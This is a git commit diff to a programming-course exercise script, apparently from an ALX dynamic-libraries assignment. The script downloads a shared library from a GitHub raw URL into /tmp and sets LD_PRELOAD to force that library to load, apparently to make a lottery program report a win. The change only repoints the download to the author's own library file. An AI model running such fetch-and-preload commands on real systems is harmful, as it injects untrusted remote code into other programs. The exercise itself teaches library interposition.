dc51e4ce30f6e350312d50e2e2c3a260c6238111
Zeezbaba <Azeez_okeleji>
2023-11-13 14:05:27 -0800

    101-make_me_win.sh

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P /tmp/ https://raw.github.com./AyomideA-S/alx-low_level_programming/main/0x18-dynamic_libraries/libruin.so
-export LD_PRELOAD=/tmp/libruin.so
+wget -P /tmp/ https://raw.github.com./Zeezbaba/alx-low_level_programming/main/0x18-dynamic_libraries/gigmillion.so
+export LD_PRELOAD=/tmp/gigmillion.so
